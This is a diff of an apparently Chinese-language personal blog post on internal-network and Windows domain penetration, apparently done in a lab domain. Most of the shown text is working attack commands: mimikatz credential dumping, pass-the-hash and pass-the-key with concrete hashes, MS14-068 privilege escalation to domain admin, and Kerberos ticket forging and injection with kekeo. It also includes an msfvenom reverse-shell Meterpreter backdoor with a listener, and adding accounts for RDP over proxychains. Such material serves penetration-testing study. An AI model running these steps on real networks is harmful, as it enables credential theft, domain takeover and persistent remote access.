+<p> 总结：KB2871997 补丁后的影响</p>
+<p>pth：没打补丁用户都可以连接，打了补丁只能 administrator 连接 </p>
+<p>ptk：打了补丁才能用户都可以连接，采用 aes256 连接</p>
+<p>参考链接: <a target="_blank" rel="noopener" href="https://www.freebuf.com/column/220740.html">https://www.freebuf.com/column/220740.html</a></p>
+<p><strong>PTT</strong></p>
+<p>PTT 攻击的部分就不是简单的 NTLM 认证了，它是利用 Kerberos 协议进行攻击的。</p>
+<p>三种 常见的攻击方法：MS14-068，Golden ticket，SILVER ticket。</p>
+<p>MS14-068 基于漏洞，造成的危害是允许域内任何一个普通用户，将自己提升至域管权限，微软给出的补丁是 kb3011780。</p>
+<p>Golden ticket(黄金票据)，SILVER ticket(白银票据)，属于权限维持技术 ，简单来说就是将连接合法的票据注入到 内存中实现连接。</p>
+<p><strong>案例:</strong></p>
+<p><strong>1.PTH传递-mimikatz</strong></p>
+<p>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可 以攻击成功。</p>
+<pre><code>privilege::debug
+sekurlsa::logonPasswords
+</code></pre>
+<p>假设我们找到了域控的hash密码</p>
+<pre><code># PTH ntlm 传递
+# 未打补丁下的工作组及域连接：
+sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7  #连接域用户
+sekurlsa::pth /user:administrator /domain:workgroup /ntlm:518b98ad4178a53695dc997aa02d455c #连接本地用户
+sekurlsa::pth /user:boss /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7
+\\OWA2010CN-God.god.org
+</code></pre>
+<p>就会弹出一个cmd窗口</p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322173836031.png" alt="image-20220322173836031"></p>
+<p><strong>2.PTK传递-mimikatz</strong></p>
+<p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322180108315.png" alt="image-20220322180108315"></p>
+<p>这个必须打了补丁才能连接，不然连不上去</p>
+<pre><code>PTK aes256 传递
+打补丁后的工作组及域连接：
+sekurlsa::ekeys #获取 aes
+sekurlsa::pth /user:mary /domain:god /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b
+</code></pre>
+<p><strong>3.域横向移动 PTT 传递-ms14068&amp;kekeo&amp;本地</strong></p>
+<p>第一种利用漏洞：能实现普通用户直接获取域控 system 权限</p>
+<p>此处mimikatz无需提升权限，因为不涉及高权限操作，一个普通用户就可以</p>
+<pre><code>#MS14-068 powershell 执行
+1.查看当前 sid whoami/user
+2.mimikatz # kerberos::purge
+//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造
+mimikatz # kerberos::list //查看当前机器凭证
+mimikatz # kerberos::ptc 票据文件 //将票据注入到内存中
+3.利用 ms14-068 生成 TGT 数据
+ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码
+MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45
+4.票据注入内存
+mimikatz.exe &quot;kerberos::ptc TGT_mary@god.org.ccache&quot; exit
+5.查看凭证列表 klist
+6.利用
+dir \\192.168.3.21\c$  #如果ip无法识别，改成计算机名字
+</code></pre>
+<p>第二种利用工具 kekeo</p>
+<pre><code>1.生成票据
+kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;
+2.导入票据
+kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi
+3.查看凭证 klist
+4.利用 net use 载入
+dir \\192.168.3.21\c$
+</code></pre>
+<p>第三种利用mimikatz导出本地票据(需要管理权限)</p>
+<p>域控连接后10h内有效</p>
+<pre><code>privilege::debug
+sekurlsa::tickets /export
+kerberos::ptt xxxxxxxxxx.xxxx.kirbi
+</code></pre>
+<p><strong>总结：ptt 传递不需本地管理员权限，连接时主机名连接，基于漏洞,工具,本地票据</strong></p>
 <h1 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h1><h2 id="ssh隧道"><a href="#ssh隧道" class="headerlink" title="ssh隧道"></a>ssh隧道</h2><p>通常，我们用于调试的计算机无法远程访问位于局域网中的待调试设备。通过 ssh 的端口转发(又称 ssh 隧道)技术，可以实现这种远程调试功能。ssh 客户端运行于本地机器，它的作用是：登录到目标机器并在目标机器上执行命令。它可以建立一个安全通道，为不安全网络上两个不受信任的主机提供安全的加密通信。X11 连接、任意 TCP 端口和 UNIX 域套接字也可以通过 ssh 安全通道进行转发。ssh 连接并登录到指定的主机名(用户名可选)。如果指定了命令，命令将在远程主机上执行，而不是在本机 shell 里执行。</p>
 <p>ssh 端口转发相关的常用选项如下：</p>
 <hr>
@@ -159,7 +606,7 @@ exploit
 </code></pre>
 <p>缺点:</p>
 <p>无法进行爆破(如hydra)等一些操作</p>
-<h1 id="常见的内网测试渗透"><a href="#常见的内网测试渗透" class="headerlink" title="常见的内网测试渗透"></a>常见的内网测试渗透</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318231904664.png" alt="image-20220318231904664"></p>
+<h1 id="MSF-常见的内网测试渗透"><a href="#MSF-常见的内网测试渗透" class="headerlink" title="MSF-常见的内网测试渗透"></a>MSF-常见的内网测试渗透</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318231904664.png" alt="image-20220318231904664"></p>
 <p>生成metaploit后门，并监听</p>
 <pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exe
 use exploit/multi/handler
@@ -236,7 +683,7 @@ meterpreter &gt; run getgui -u sakura -p 123456 #增加用户
 </code></pre>
 <pre><code>root@kali:~# proxychains rdesktop -u Administrator -p 123456 10.10.10.131 #登录3389端口
 </code></pre>
-<h1 id="一次完整的域渗透流程"><a href="#一次完整的域渗透流程" class="headerlink" title="一次完整的域渗透流程"></a>一次完整的域渗透流程</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319122142921.png" alt="image-20220319122142921"></p>
+<h1 id="MSF进行一次完整的域渗透流程"><a href="#MSF进行一次完整的域渗透流程" class="headerlink" title="MSF进行一次完整的域渗透流程"></a>MSF进行一次完整的域渗透流程</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319122142921.png" alt="image-20220319122142921"></p>
 <p>渗透前提:拿到了域客户机2008的shell</p>
 <p>生成metaploit后门，并监听</p>
 <pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exe
@@ -359,7 +806,7 @@ socks4 192.168.0.115 1080
 <p>增加账号</p>
 <pre><code>meterpreter &gt; run getgui -u moonsec -p moonsec
 </code></pre>
-</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/">https://sakurahack-y.github.io/2022/03/18/内网渗透篇/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E5%86%85%E7%BD%91/">内网</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">1.</span> <span class="toc-text">隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E9%9A%A7%E9%81%93"><span class="toc-number">1.1.</span> <span class="toc-text">ssh隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="toc-number">1.2.</span> <span class="toc-text">端口转发与端口映射</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socket%E9%9A%A7%E9%81%93"><span class="toc-number">1.3.</span> <span class="toc-text">socket隧道</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B7%A8%E8%B7%AF%E7%94%B1%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">跨路由扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%86%85%E7%BD%91%E6%B5%8B%E8%AF%95%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">常见的内网测试渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84%E5%9F%9F%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">一次完整的域渗透流程</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Fastjson漏洞复现 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/">https://sakurahack-y.github.io/2022/03/18/内网渗透篇/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E5%86%85%E7%BD%91/">内网</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">域的搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91"><span class="toc-number">3.</span> <span class="toc-text">域横向</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E5%BF%85%E5%A4%87%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">3.1.</span> <span class="toc-text">域横向必备知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#at-amp-amp-schtasks-%E5%AF%86%E7%A0%81%E6%98%AF%E6%98%8E%E6%96%87"><span class="toc-number">3.2.</span> <span class="toc-text">at&amp;&amp;schtasks(密码是明文)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#atexec-impacket-%E6%98%8E%E6%96%87%E5%92%8CHASH-%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">3.3.</span> <span class="toc-text">atexec-impacket 明文和HASH 传递攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Procdump-Mimikatz-%E9%85%8D%E5%90%88%E8%8E%B7%E5%8F%96hash%E5%AF%86%E7%A0%81"><span class="toc-number">3.4.</span> <span class="toc-text">Procdump+Mimikatz 配合获取hash密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8-psexec-%E5%AE%98%E6%96%B9%E8%87%AA%E5%B8%A6-%E7%AC%AC%E4%B8%89%E6%96%B9-smbexec-%E5%8F%AA%E6%9C%89%E7%AC%AC%E4%B8%89%E6%96%B9"><span class="toc-number">3.5.</span> <span class="toc-text">SMB 服务利用-psexec(官方自带+第三方),smbexec(只有第三方)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMI-%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8-wmic-cscript-wmiexec"><span class="toc-number">3.6.</span> <span class="toc-text">WMI 服务利用-wmic,cscript,wmiexec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH-amp-PTK-amp-PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92"><span class="toc-number">3.7.</span> <span class="toc-text">PTH&amp;PTK&amp;PTT哈希票据传递</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">4.</span> <span class="toc-text">隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E9%9A%A7%E9%81%93"><span class="toc-number">4.1.</span> <span class="toc-text">ssh隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="toc-number">4.2.</span> <span class="toc-text">端口转发与端口映射</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socket%E9%9A%A7%E9%81%93"><span class="toc-number">4.3.</span> <span class="toc-text">socket隧道</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B7%A8%E8%B7%AF%E7%94%B1%E6%89%AB%E6%8F%8F"><span class="toc-number">5.</span> <span class="toc-text">跨路由扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%86%85%E7%BD%91%E6%B5%8B%E8%AF%95%E6%B8%97%E9%80%8F"><span class="toc-number">6.</span> <span class="toc-text">MSF-常见的内网测试渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E8%BF%9B%E8%A1%8C%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84%E5%9F%9F%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B"><span class="toc-number">7.</span> <span class="toc-text">MSF进行一次完整的域渗透流程</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">&lt; html学习笔记</a><a class="next" href="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Fastjson漏洞复现 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
 .night .v[data-class=v] a:hover { color: #216C73 !important; }
 .night .v[data-class=v] li { list-style: inherit; }
 .night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
